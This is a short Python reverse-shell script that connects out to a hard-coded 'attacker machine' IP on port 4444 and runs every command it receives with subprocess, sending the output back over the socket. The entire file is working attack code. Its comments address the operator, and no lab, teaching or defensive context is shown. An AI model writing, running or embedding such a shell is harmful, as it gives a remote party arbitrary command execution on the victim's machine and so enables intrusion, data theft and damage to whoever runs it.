import socket
import subprocess
import os

# Configure attacker connection
ATTACKER_IP = "192.168.1.10"  # Your attacker machine
ATTACKER_PORT = 4444           # Listening port

# Connect to attacker
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ATTACKER_IP, ATTACKER_PORT))
s.send(b"[+] Reverse shell connected.\n")

# Command execution loop
while True:
    try:
        cmd = s.recv(1024).decode().strip()
        if cmd.lower() in ("exit", "quit"):
            break
        output = subprocess.getoutput(cmd)
        s.send(output.encode())
    except Exception as e:
        s.send(f"[!] Error: {e}\n".encode())
        break

s.close()